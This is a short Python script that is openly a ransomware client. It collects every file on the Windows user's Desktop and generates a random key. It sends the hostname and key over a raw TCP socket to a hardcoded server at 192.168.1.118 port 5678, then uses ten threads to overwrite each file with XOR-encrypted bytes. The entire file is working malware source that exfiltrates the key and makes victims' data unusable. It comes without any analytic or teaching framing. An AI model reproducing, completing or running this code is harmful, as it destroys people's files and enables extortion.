import socket
import threading
import os 
import colorama 
import random 
import queue

from random import randint
from queue import Queue
from colorama import Fore

# Encrypt Files
def encrypt(key):
    while True:
        file = q.get()
        print(f"Encrypting {file}")
        try:
            key_index = 0
            max_key_index = len(key) -1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} Successfully encrypted')
        except:
            print(f'Failed To encrypt {file}')
        q.task_done()
        
# Socket information 
ip_address = '192.168.1.118'
port = 5678

# encryption information
encryption_level = 512 // 8 
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[]#@></\?.,'
key_char_pool_len = len(key_char_pool)

#Grab file Paths 

print("Preparing Files..")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'txt':
        abs_files.append(f'{desktop_path}\\{f}')
print("Successfully Located Files")

# Grabs Clients Hostname
hostname = os.getenv('COMPUTERNAME')

# Generate Encryption Key
print(f"{Fore.YELLOW}[!]Generating encryption key Please stand by")
key = ''
for i in range(encryption_level):
    key += key_char_pool[random.randint(0, key_char_pool_len-1)]
print(f"{Fore.YELLOW}[!] KEY GENERATED")

# Connect to server to transfer key to host name

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    print(f"{Fore.GREEN}[>] Successfully Connected Transmitting Key and Hostname")
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print(f'{Fore.YELLOW}[!] Finished Transmitting Data [!]')
    s.close()

# Store files into queue for threads to handle

q = queue.Queue()
for f in abs_files:
    q.put(f)


#Setup Threads For encryption
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()


q.join()
print('Encryption Completed Successfully....')
input()

